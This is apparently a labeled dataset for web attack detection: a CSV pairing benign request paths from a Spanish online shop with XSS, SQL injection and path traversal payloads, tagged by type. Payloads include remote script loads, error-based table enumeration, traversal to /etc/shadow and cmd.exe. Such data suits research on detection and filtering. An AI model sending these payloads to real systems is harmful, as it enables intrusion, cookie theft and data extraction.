payload,type
miembros/imagenes/ogono.jpg,normal
%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE},traversal
miembros/imagenes/ogono.jpg,normal
o(n)&: select * from users where id=1 %($) or 1=1 -- 1,sqli
miembros/imagenes/ogono.jpg,normal
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss
0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE},traversal
miembros/imagenes/ogono.jpg,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=0&B1=A%F1adir+al+carrito,normal
"""`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>",xss
&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
&lt;!--[if gte IE 4]&gt;               ,xss
"ABC<div style=""x:\x09expression(javascript:alert(1)"">DEF",xss
miembros/imagenes/zarauz.jpg,normal
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",xss
publico/caracteristicas.jsp?id=1,normal
<input value=<><iframe/src=javascript:confirm(1),xss
imagenes/2.gif,normal
%%32%65%%32%65/{FILE},traversal
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE},traversal
admin') or '1'='1'#,sqli
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,xss
miembros/fotos.jsp,normal
"s:&1c: select * from users where id=1 or 1#"": or 1=1 -- 1",sqli
imagenes/1.gif,normal
imagenes/logo.gif,normal
&<script>document.vulnerable=true;</script>,xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=33&B1=A%F1adir+al+carrito,normal
"&1oon: select * from users where id=1 or \+<$ union select 1,@@VERSION -- 1",sqli
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=22&B1=A%F1adir+al+carrito,normal
"<!--<img src=""--><img src=x onerror=alert(123)//"">",xss
miembros/index.jsp,normal
publico/miembros.jsp,normal
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss
"</ foo=""><script>javascript:alert(1)</script>"">",xss
miembros/imagenes/zarauz.jpg,normal
publico/productos.jsp,normal
imagenes/nuestratierra.jpg,normal
%252e%252e/%252e%252e/{FILE},traversal
global/creditos.jsp,normal
publico/productos.jsp,normal
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,traversal
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/miembros.jsp,normal
publico/productos.jsp,normal
miembros/imagenes/ogono.jpg,normal
""">/XaDoS/><script>alert(document.cookie)</script><script src=""http://www.site.com/XSS.js""></script>",xss
publico/autenticar.jsp?modo=entrar&login=ninnette&pwd=gAs40SO&remember=on&B1=Entrar,normal
<scr<script>ipt>alert(1)</scr</script>ipt>,xss
imagenes/cmenbul.gif,normal
"<;LAYER SRC="";http://ha.ckers.org/scriptlet.html"";>;<;/LAYER>;",xss
publico/productos.jsp,normal
..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
imagenes/cmenbul.gif,normal
%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
' or username is not NULL or username = ',sqli
imagenes/2.gif,normal
"<a href=""\x10javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/productos.jsp,normal
miembros/index.jsp,normal
"""`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>",xss
<script>javascript:alert(1)</script\x0B,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
........................................................................../../{FILE},traversal
miembros/imagenes/castro.jpg,normal
global/menum.jsp,normal
miembros/index.jsp,normal
<script x> alert(1) </script 1=2,xss
global/creditos.jsp,normal
create user name identified by pass123 temporary tablespace temp default tablespace users; ,sqli
miembros/editar.jsp?modo=registro&login=walker&password=estate&nombre=Ubaldo&apellidos=Gayol&email=bruzzese%40audiosat.ar&dni=00903443A&direccion=C%2F+Fernan+Gonzalez%2C+45+13-B&ciudad=Joyosa%2C+La&cp=31243&provincia=Valladolid&ntc=7428930336953992&B1=Registrar,normal
publico/carrito.jsp,normal
publico/pagar.jsp?modo=insertar&precio=1776&B1=Pasar+por+caja,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=64&B1=A%F1adir+al+carrito,normal
global/creditos.jsp,normal
publico/productos.jsp,normal
imagenes/3.gif,normal
"s1?s: select * from users where id=1 or ""1]"" or 1=1 -- 1",sqli
.\\..\\.\\..\\.\\..\\{FILE},traversal
global/creditos.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i",sqli
..%2f..%2f..%2f..%2f{FILE},traversal
"<IMG SRC=""jav ascript:alert('XSS');"">",xss
"<embed src=""javascript:alert(1)"">",xss
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=39&B1=A%F1adir+al+carrito,normal
global/estilos.css,normal
global/estilos.css,normal
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,xss
miembros/index.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
publico/miembros.jsp,normal
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",xss
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
"<img src=x\x10onerror=""javascript:alert(1)"">",xss
&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;,xss
miembros/fotos.jsp,normal
miembros/fotos.jsp,normal
miembros/imagenes/zarauz.jpg,normal
"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",xss
imagenes/1.gif,normal
"<img SRC=""jav ascript:document.vulnerable=true;"">",xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=3&B1=A%F1adir+al+carrito,normal
o&1c: select * from users where id=1 <@ or 1=1 -- 1,sqli
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
imagenes/2.gif,normal
"""`'><script>\x21javascript:alert(1)</script>",xss
"UEov,: select * from users where id=1 union select !<@,version() -- 1",sqli
..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
publico/productos.jsp,normal
global/menum.jsp,normal
publico/pagar.jsp?modo=insertar&precio=119&B1=Pasar+por+caja,normal
&,sqli
publico/carrito.jsp,normal
publico/autenticar.jsp?modo=entrar&login=cas&pwd=82pe6m77b57i0a%2Bd&remember=on&B1=Entrar,normal
%253cscript%253ealert(document.cookie)%253c/script%253e,xss
global/creditos.jsp,normal
&#X000003C,xss
<script\x0A>javascript:alert(1)</script>,xss
"<IMG SRC=x oncopy=""alert(String.fromCharCode(88,83,83))"">",xss
"<svg onUnload svg onUnload=""javascript:javascript:alert(1)""></svg onUnload>",xss
".UEf(: select * from users where id=1.  union select version(),version() -- 1",sqli
index.jsp,normal
miembros/fotos.jsp,normal
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
../..//../{FILE},traversal
miembros/editar.jsp?modo=registro&login=caudle&password=entremezclar&nombre=Blasinda&apellidos=Trafelati+Zurera&email=soeltoft%40nanogenerador.pr&dni=15896821A&direccion=Guadalquivir+116%2C+&ciudad=Cercs&cp=17405&provincia=Ourense&ntc=8245101859277917&B1=Registrar,normal
"<IMG SRC=x onwheel=""alert(String.fromCharCode(88,83,83))"">",xss
"<;IMG SRC=`javascript:alert("";RSnake says, ';XSS';"";)`>;",xss
global/creditos.jsp,normal
miembros/salir.jsp,normal
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",xss
1 or 1=1,sqli
imagenes/cmenbul.gif,normal
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},xss
"<img \x00src=x onerror=""alert(1)"">",xss
publico/productos.jsp,normal
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",xss
publico/autenticar.jsp?modo=entrar&login=thibaud79&pwd=r393lin3nte&remember=on&B1=Entrar,normal
imagenes/cmenbul.gif,normal
publico/autenticar.jsp?modo=entrar&login=marshaus&pwd=rEgIr&remember=on&B1=Entrar,normal
publico/caracteristicas.jsp?id=1,normal
"' union select * from users where login = char(114,111,111,116);",sqli
uni/**/on sel/**/ect,sqli
&<script>document.vulnerable=true;</script>,xss
imagenes/cmenbul.gif,normal
global/titulo.jsp,normal
"`""'><img src=xxx:x \x09onerror=javascript:alert(1)>",xss
imagenes/nuestratierra.jpg,normal
imagenes/3.gif,normal
"' union (select NULL, NULL, (select @@version)) --",sqli
global/titulo.jsp,normal
"s).s: select * from users where id=1 or "").""=1 or 1=1 -- 1",sqli
imagenes/nuestratierra.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<;HTML>;<;BODY>;,xss
"<iframe/src=""data:text/html,<svg &#111;&#110;load=alert(1)>"">",xss
n1&1c: select * from users where id=1 +$ 1 or 1=1 -- 1,sqli
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE},traversal
"o.nUE: select * from users where id=1 <@.$ union select 1,version() -- 1",sqli
"<META HTTP-EQUIV=\""refresh\"" CONTENT=\""0; URL=http://;URL=javascript:alert('XSS');\"">",xss
"<XSS STYLE=""behavior: url(xss.htc);"">",xss
index.jsp,normal
miembros/imagenes/castro.jpg,normal
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss
publico/productos.jsp,normal
miembros/editar.jsp?modo=registro&login=chaiman&password=ge2613an0&nombre=Zulaica&apellidos=Castellanos+G%F2dia&email=weinberger%40privatebanking.com.nz&dni=27340064X&direccion=San+Ambrosio+65+6%3FH&ciudad=Vega+de+Valcarce&cp=01548&provincia=A+Coru%F1a&ntc=4592439732004751&B1=Registrar,normal
global/estilos.css,normal
publico/miembros.jsp,normal
publico/productos.jsp,normal
publico/miembros.jsp,normal
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
publico/miembros.jsp,normal
imagenes/logo.gif,normal
miembros/imagenes/ogono.jpg,normal
publico/productos.jsp,normal
"<;IMG SRC="";mocha:[code]"";>;",xss
global/titulo.jsp,normal
publico/caracteristicas.jsp?id=1,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/zarauz.jpg,normal
global/estilos.css,normal
"so..U: select * from users where id='1'<@.. union select 1,version() -- 1'",sqli
“><ScRiPt>alert(document.cookie)</script>,xss
"<;DIV STYLE="";width: expression(alert(';XSS';));"";>;",xss
publico/carrito.jsp,normal
<style>@import'http://www.securitycompass.com/xss.css';</style>,xss
index.jsp,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=36&B1=A%F1adir+al+carrito,normal
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",xss
miembros/index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=beique&pwd=carricar&remember=on&B1=Entrar,normal
miembros/imagenes/ogono.jpg,normal
imagenes/nuestratierra.jpg,normal
imagenes/logo.gif,normal
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss
miembros/index.jsp,normal
"<IMG SRC=x ondrop=""alert(String.fromCharCode(88,83,83))"">",xss
%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE},traversal
global/titulo.jsp,normal
bfilename,sqli
publico/autenticar.jsp?modo=entrar&login=mame&pwd=alAR1aDo0&remember=off&B1=Entrar,normal
publico/autenticar.jsp?modo=entrar&login=ronaldso&pwd=enjoyelada&remember=on&B1=Entrar,normal
"0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",xss
"<a href=""javas\x0Acript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"svUEv: select * from users where id=1 or 1#""@ union select null,version() -- 1",sqli
publico/caracteristicas.jsp?id=2,normal
"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",xss
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
imagenes/2.gif,normal
miembros/imagenes/ogono.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
"o.UEf: select * from users where id=1  <@. union select version(),version() -- 1",sqli
"<;A HREF="";http://66.102.7.147/"";>;XSS<;/A>;",xss
"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",xss
"<a href=""javas\x00cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
index.jsp,normal
<frameset onload=javascript:alert(1)>,xss
"<XML ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:document.vulnerable=true""></B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></span>",xss
index.jsp,normal
publico/registro.jsp?modo=registro&login=humphrie&password=PELamEn&nombre=Caleb&apellidos=Manay+Crespo&email=terry%40mtos.ar&dni=73488403E&direccion=C%2F+Jara+9%2C+&ciudad=Campanario&cp=47320&provincia=Segovia&ntc=9267680844011077&B1=Registrar,normal
publico/autenticar.jsp?modo=entrar&login=beatty64&pwd=propaganda&remember=off&B1=Entrar,normal
..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,traversal
imagenes/2.gif,normal
imagenes/1.gif,normal
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
publico/carrito.jsp,normal
imagenes/1.gif,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i",sqli
miembros/editar.jsp?modo=registro&login=carilyn&password=e1pirativo&nombre=Aventino&apellidos=Abell%F3+Lamarca&email=plang_schallert%40white-pearl-resort.kp&dni=66718383Y&direccion=C%2F+Misericordia%2C+57+7-H&ciudad=Baides&cp=35231&provincia=Valladolid&ntc=6302817063301722&B1=Registrar,normal
"&lt;SCRIPT/XSS SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
miembros/index.jsp,normal
publico/miembros.jsp,normal
global/estilos.css,normal
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/index.jsp,normal
../../{FILE},traversal
miembros/fotos.jsp,normal
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
..\..\..\..\..\..\..\..\..\..\etc\shadow%00,traversal
imagenes/3.gif,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",sqli
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
&#X000003C;,xss
imagenes/3.gif,normal
publico/autenticar.jsp?modo=entrar&login=ersil&pwd=teosa&remember=on&B1=Entrar,normal
publico/registro.jsp?modo=registro&login=cairisti&password=0a31e7a4&nombre=Luciano&apellidos=%C1vila+Kusanovic&email=moston%40sierradealcaraz.sg&dni=78128253J&direccion=Moncayo+46%2C+&ciudad=Cigudosa&cp=02649&provincia=Huesca&ntc=2771560137305516&B1=Registrar,normal
hi' or 'a'='a,sqli
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE},traversal
%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},traversal
%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE},traversal
global/titulo.jsp,normal
imagenes/3.gif,normal
..%%32%66..%%32%66..%%32%66..%%32%66{FILE},traversal
global/titulo.jsp,normal
"admin"") or ""1""=""1""--",sqli
imagenes/cmenbul.gif,normal
index.jsp,normal
imagenes/nuestratierra.jpg,normal
miembros/imagenes/zarauz.jpg,normal
..%252f..%252f..%252f..%252f..%252f{FILE},traversal
imagenes/cmenbul.gif,normal
"<IMG SRC=x onstalled=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/logo.gif,normal
miembros/index.jsp,normal
publico/miembros.jsp,normal
publico/registro.jsp?modo=registro&login=triggian&password=96TO3a38&nombre=Gloria&apellidos=Francino+Llosa&email=debicki%40prestoesesto.hr&dni=75010741J&direccion=C%2F+Barrio+De+Recuesto%2C+195+6-H&ciudad=Chipiona&cp=16312&provincia=Lleida&ntc=8099861085079421&B1=Registrar,normal
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
"noUEv: select * from users where id=1 +$+ union select null,@@VERSION -- 1",sqli
miembros/salir.jsp,normal
..%c1%9c{FILE},traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
imagenes/1.gif,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE},traversal
imagenes/3.gif,normal
"noo1U: select * from users where id=1 + $+%1 union select null,@@VERSION -- 1",sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
" or 1=1 or """"=",sqli
"<;IMG SRC="";javascript:alert(';XSS';);"";>;",xss
</script><script>alert(1)</script>,xss
global/titulo.jsp,normal
miembros/index.jsp,normal
"<img \x11src=x onerror=""javascript:alert(1)"">",xss
global/menum.jsp,normal
imagenes/cmenbul.gif,normal
global/estilos.css,normal
imagenes/2.gif,normal
imagenes/nuestratierra.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/creditos.jsp,normal
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
limit,sqli
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
publico/carrito.jsp,normal
global/menum.jsp,normal
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
"<IMG SRC=x onkeydown=""alert(String.fromCharCode(88,83,83))"">",xss
"<img\x11src=x onerror=""javascript:alert(1)"">",xss
' or 1=1 or ''=',sqli
publico/productos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=9334&B1=Confirmar,normal
miembros/fotos.jsp,normal
"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/creditos.jsp,normal
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>",xss
"s;UEf: select * from users where id=1 or 1#""; union select version(),version() -- 1",sqli
%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33,traversal
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
"<img SRC=""jav ascript:document.vulnerable=true;"">",xss
imagenes/1.gif,normal
miembros/editar.jsp?modo=registro&login=aleksand&password=cerramiento&nombre=Gerarda&apellidos=Lao&email=shukuri%40velaconsultores.nl&dni=54415049Q&direccion=Pasaje+Pedrosa+115%2C+6F&ciudad=Mieza&cp=47400&provincia=C%E1ceres&ntc=5563798964634481&B1=Registrar,normal
imagenes/logo.gif,normal
miembros/salir.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/3.gif,normal
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
%2e%2e%2f{FILE},traversal
"s.)s: select * from users where id=1 or "".)"" or 1=1 -- 1",sqli
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
publico/carrito.jsp,normal
miembros/fotos.jsp,normal
\../\../\../{FILE},traversal
imagenes/logo.gif,normal
26%,sqli
index.jsp,normal
"a=\""get\"";",xss
imagenes/2.gif,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=36&B1=A%F1adir+al+carrito,normal
global/creditos.jsp,normal
"s{o1U: select * from users where id=1 or @#""{=1 union select 1,version() -- 1",sqli
imagenes/3.gif,normal
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/,xss
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
imagenes/3.gif,normal
imagenes/3.gif,normal
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;,xss
miembros/editar.jsp?modo=registro&login=abdel-az&password=berberisco&nombre=Zaqueo&apellidos=Cabada+Ferrus&email=gentry.gast%40luchalibremexicana.cat&dni=43141809L&direccion=General+Bravo%2C+189%2C+&ciudad=Collado+Mediano&cp=31281&provincia=Salamanca&ntc=2840005774765443&B1=Registrar,normal
"'""></title><script>alert(""XSS by \nxss"")</script>><marquee><h1>XSS by xss</h1></marquee>",xss
global/estilos.css,normal
..\..\..\..\..\..\..\..\{FILE},traversal
imagenes/3.gif,normal
imagenes/cmenbul.gif,normal
imagenes/nuestratierra.jpg,normal
"<IMG SRC=""javascript:alert('XSS')""",xss
' or 'whatever' in ('whatever'),sqli
imagenes/3.gif,normal
miembros/editar.jsp?modo=registro&login=zlotnick&password=aGoBiAr&nombre=Isabel&apellidos=Yescas+Feal&email=broughton0%40naturalchild.lc&dni=33437614F&direccion=C%2F+Academia%2C+59%2C+3%3FG&ciudad=Benidoleig&cp=21890&provincia=Navarra&ntc=8971303615649056&B1=Registrar,normal
publico/productos.jsp,normal
imagenes/logo.gif,normal
%2e%2e%5c%2e%2e%5c{FILE},traversal
publico/caracteristicas.jsp?id=1,normal
"&oUE1: select * from users where id=1 or \<\ union select 1,@@VERSION -- 1",sqli
index.jsp,normal
publico/productos.jsp,normal
‘ or 3=3 --%                     ,sqli
"<IMG SRC=x onprogress=""alert(String.fromCharCode(88,83,83))"">",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/pagar.jsp?modo=insertar&precio=1294&B1=Pasar+por+caja,normal
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",xss
miembros/imagenes/zarauz.jpg,normal
publico/miembros.jsp,normal
imagenes/cmenbul.gif,normal
miembros/imagenes/ogono.jpg,normal
imagenes/3.gif,normal
miembros/imagenes/zarauz.jpg,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=javascript:alert(';XSS';);"";>;",xss
global/creditos.jsp,normal
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",xss
miembros/imagenes/ogono.jpg,normal
"s1:s: select * from users where id=1 or ""1:"" or 1=1 -- 1",sqli
publico/carrito.jsp,normal
publico/carrito.jsp,normal
